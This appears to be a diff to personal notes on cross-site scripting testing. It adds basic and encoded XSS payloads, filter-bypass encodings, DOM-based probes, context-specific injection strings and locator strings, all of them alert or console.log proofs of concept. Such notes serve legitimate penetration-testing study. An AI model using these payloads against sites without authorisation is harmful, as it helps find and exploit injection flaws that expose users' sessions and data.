@@ -1,5 +1,23 @@
 
 
+- Payload Crafting and Testing
+    - Basic XSS Payloads:
+        Start with simple scripts: <script>alert('XSS')</script>
+    - Test inputs in query parameters, POST data, and headers.
+
+- Bypass Filters:
+    - Test encoded payloads: <img src=x onerror=alert('XSS')> %3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E
+    - Use different encodings: URL encoding, HTML entities, Base64.
+
+- DOM-Based XSS:
+    - Inject payloads into DOM-exposed inputs and observe changes: <img src=x onerror=console.log(document.domain)>
+    - Look for vulnerable JavaScript using tools like browser DevTools.
+
+- Contextual Testing:
+    - Payloads vary depending on the context:
+        - HTML Context: <img src=x onerror=alert('XSS')>
+        - JavaScript Context: '); alert('XSS');//
+        - Attribute Context: " onmouseover=alert('XSS') ".
 
 
 1. Reflected XSS is also sometimes referred to as Non-Persistent or Type-II XSS.
@@ -66,8 +84,12 @@ https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_C
     
 
 ## Find XSS vulnerabilities
-1. <i>test</i>
-2. <i>hasanqoli</i>
+<i>test</i>
+<i>hasanqoli</i>
+"><h1>test</h1>
+'+alert(1)+'
+onmouseover="alert(1)"
+http://"onmouseover="alert(1)
 
 
 
@@ -116,6 +138,10 @@ An attacker who exploits a cross-site scripting vulnerability is typically able 
 --------------------------------------------------------------------
 XSS Locators:
 'q';!--"xss"<XSS>=&{(p)}
+"><h1>test</h1>
+'+alert(1)+'
+onmouseover="alert(1)"
+http://"onmouseover="alert(1)
 --------------------------------------------------------------------
 Classic Payloads:
 <svg onload=alert(1)>
